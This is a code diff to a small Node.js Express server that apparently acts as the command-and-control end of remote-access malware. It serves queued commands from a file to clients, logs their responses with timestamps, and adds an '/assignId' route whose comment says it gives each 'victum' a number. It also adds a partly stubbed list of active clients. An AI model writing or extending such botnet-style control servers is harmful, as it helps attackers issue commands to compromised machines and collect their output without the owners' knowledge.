@@ -15,14 +15,12 @@ app.post('/command',function(req,res){
 	var clNum = req.body.num;
 	var cmdRes = req.body.cmd;
 
-	console.log(req.body);
-
 	var timeStamp = getDateTime();
 	var data = timeStamp + " Client: " + clNum + " Response: " + cmdRes;
 
 
 	console.log(data);
-	fs.writeFile("/home/davidpruitt/Desktop/Files/data.txt", data, function(err){
+	fs.appendFileSync("/home/davidpruitt/Desktop/Files/data.txt", data, function(err){
 		if(err){
 			return console.log(err);
 		}
@@ -34,6 +32,19 @@ app.post('/command',function(req,res){
 //time:xx,xx,xx cnum:xxx cmd:xxxxx
 app.get('/newCmd',function(req,res){
 	res.sendfile("cmd.txt");
+});
+
+//Assigns a victum a number to pass data directly to it
+var newestID = 0;
+app.get('/assignId', function(req,res){
+	console.log(newestID);
+	fs.writeFile("/home/davidpruitt/Desktop/Files/currentId.txt", "idNum:" + newestID, function(err){
+		if(err){
+			return console.log(err);
+		}
+	})
+	res.sendfile("/home/davidpruitt/Desktop/Files/currentId.txt");
+	newestID++;
 });
 
 app.listen(3000, function(){
@@ -56,4 +67,24 @@ function getDateTime()
 	//add rest of time stamp
 
 	return hour + ':' + min + ':' + sec;
+}
+
+
+var ActiveClients = [];
+
+function addToListOfActiveClient(iD)
+{
+	ActiveClients.push({
+		ClientId: iD
+	});
+}
+
+function removeFromListOfActiveClient(iD)
+{
+
+}
+
+function getListOfActiveClient()
+{
+
 }
